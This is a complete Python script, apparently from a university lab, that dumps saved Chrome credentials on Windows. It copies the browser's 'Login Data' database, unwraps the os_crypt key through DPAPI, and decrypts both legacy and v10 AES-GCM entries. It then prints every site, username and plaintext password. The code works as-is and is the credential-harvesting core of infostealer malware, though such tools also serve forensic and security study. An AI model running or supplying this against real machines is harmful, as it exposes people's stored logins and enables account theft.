#! /usr/bin/env python3                                                                                                                                                                                                                       

import sqlite3
import os
from os import getenv
from shutil import copyfile
import json
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64

DPAPI_prefix = b'DPAPI'
v10_prefix = b'v10'
nonce_size = 12  # 96/8
key_length = 32  # 256/8
legacy = 0
v10 = 1


# Copie le fichier contenant les mots de passes (pour permissions)
def init_db():
    path = os.path.abspath(getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\Login Data")
    db_path = os.path.abspath(getenv("APPDATA") + r"\..\..\LoginFile")
    copyfile(path, db_path)
    return db_path


# Récupère la clé utilisée pa os_crypt
def get_os_crypt_key():
    pref_service_path = os.path.abspath(getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Local State")
    with open(pref_service_path) as f:
        d = json.load(f)
    encrypted_key = base64.decodebytes(bytes(d['os_crypt']['encrypted_key'], 'utf-8'))[len(DPAPI_prefix):]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


# Renvoie depuis la base de données les valeurs chiffrées
def get_encrypted_data(db_path):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    data = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    return data


def legacy_string(encrypted_password):
    return not encrypted_password.startswith(v10_prefix)


# Méthode legacy pré-v10 avec DPAPI
def get_decrypted_data_legacy(legacy_encrypted_password):
    return win32crypt.CryptUnprotectData(legacy_encrypted_password, None, None, None, 0)[1]


# Obtenir la nonce
def get_nonce(ciphertext):
    # 'v10' is 3 bytes, we remove that
    return ciphertext[len(v10_prefix):nonce_size + len(v10_prefix)]


# Methode v10 pour déchiffre les mdp
def get_decrypted_data(encrypted_password):
    # Récupère la nonce de 12 bytes en l'isolant
    nonce = get_nonce(encrypted_password)

    # Isole le cipher en retirant le préfixe
    raw_cipher = encrypted_password[len(v10_prefix) + nonce_size:]

    # making the key
    cryptor = AESGCM(get_os_crypt_key())

    return cryptor.decrypt(nonce, raw_cipher, b"")


def multi_decrypt(encrypted_data, counter):
    if legacy_string(encrypted_data):
        counter[legacy] += 1
        return get_decrypted_data_legacy(encrypted_data)
    else:
        counter[v10] += 1
        return get_decrypted_data(encrypted_data)


if __name__ == "__main__":

    print("==== Chrome/Chromium Password Decrypter (Windows) ====")
    print("\t=== by Julien SATTI @ LIF/UQAC ===")

    counter = [0, 0]

    # Lance la boucle dans la BDD pour déchiffrer et afficher les identifiants
    for url, user, encrypted_password in get_encrypted_data(init_db()):
        if url:  # Vérifie que l'enregistrement SQL n'est pas vide
            print("\nProcessing record number " + str(counter[legacy] + counter[v10]) + ":")
            print(" * Website: {}".format(url))
            print(" * Username: {}".format(user))
            print("\r * Password: {}".format(multi_decrypt(encrypted_password, counter).decode('utf-8')))

    print("\nA total of " + str(counter[legacy] + counter[v10]) + " credentials have been decrypted, including " + str(counter[legacy]) + " using the legacy DPAPI encryption...")
